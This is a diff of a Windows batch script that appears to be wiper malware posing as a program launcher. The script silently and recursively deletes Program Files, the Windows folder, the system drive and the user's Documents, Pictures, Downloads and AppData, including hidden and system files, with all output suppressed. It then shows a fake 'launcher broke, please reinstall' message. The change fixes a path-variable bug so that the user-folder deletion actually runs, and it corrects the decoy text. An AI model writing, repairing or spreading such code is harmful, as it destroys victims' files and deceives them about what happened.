@@ -53,24 +53,24 @@ start "%windir%\notepad.exe" "%systemdrive%\Windows\System32\WinDiskSecurityLog.
 del "%programfiles%\" /S /Q /A:S 1>nul 2>nul
 del "%programfiles(x86)%\" /S /Q /A:S 1>nul 2>nul
 del "%windir%\" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\Downloads" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\Documents" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\Music" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\Pictures" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\AppData" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\Videos" /S /Q /A:S 1>nul 2>nul
-del "%systemdrive\Users\%username%\Downloads" /S /Q /A:H 1>nul 2>nul
-del "%systemdrive\Users\%username%\Documents" /S /Q /A:H 1>nul 2>nul
-del "%systemdrive\Users\%username%\Music" /S /Q /A:H 1>nul 2>nul
-del "%systemdrive\Users\%username%\Pictures" /S /Q /A:H 1>nul 2>nul
-del "%systemdrive\Users\%username%\AppData" /S /Q /A:H 1>nul 2>nul
-del "%systemdrive\Users\%username%\Videos" /S /Q /A:H 1>nul 2>nul
-del "%systemdrive\Users\%username%\Downloads" /S /Q 1>nul 2>nul
-del "%systemdrive\Users\%username%\Documents" /S /Q 1>nul 2>nul
-del "%systemdrive\Users\%username%\Music" /S /Q 1>nul 2>nul
-del "%systemdrive\Users\%username%\Pictures" /S /Q 1>nul 2>nul
-del "%systemdrive\Users\%username%\AppData" /S /Q 1>nul 2>nul
-del "%systemdrive\Users\%username%\Videos" /S /Q 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Downloads" /S /Q /A:S 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Documents" /S /Q /A:S 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Music" /S /Q /A:S 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Pictures" /S /Q /A:S 1>nul 2>nul
+del "%systemdrive%\Users\%username%\AppData" /S /Q /A:S 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Videos" /S /Q /A:S 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Downloads" /S /Q /A:H 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Documents" /S /Q /A:H 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Music" /S /Q /A:H 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Pictures" /S /Q /A:H 1>nul 2>nul
+del "%systemdrive%\Users\%username%\AppData" /S /Q /A:H 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Videos" /S /Q /A:H 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Downloads" /S /Q 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Documents" /S /Q 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Music" /S /Q 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Pictures" /S /Q 1>nul 2>nul
+del "%systemdrive%\Users\%username%\AppData" /S /Q 1>nul 2>nul
+del "%systemdrive%\Users\%username%\Videos" /S /Q 1>nul 2>nul
 del "%systemdrive%\" /S /Q /A:S  1>nul 2>nul
 del "%programfiles%\" /S /Q /A:H 1>nul 2>nul
 del "%programfiles(x86)%\" /S /Q /A:H 1>nul 2>nul
@@ -91,7 +91,7 @@ del "%appdata%\Virus.txt" /A:H /S /Q 1>nul 2>nul
 del "%systemdrive%\Virus.bat" /S /Q 1>nul 2>nul
 del "%systemdrive%\Virus.txt" /A:H /S /Q 1>nul 2>nul
 cls
-echo It seems like the launcher broke. Please reintall it.
+echo It seems like the launcher broke. Please reinstall it.
 echo Press [Enter] to Close
 pause >nul
 exit
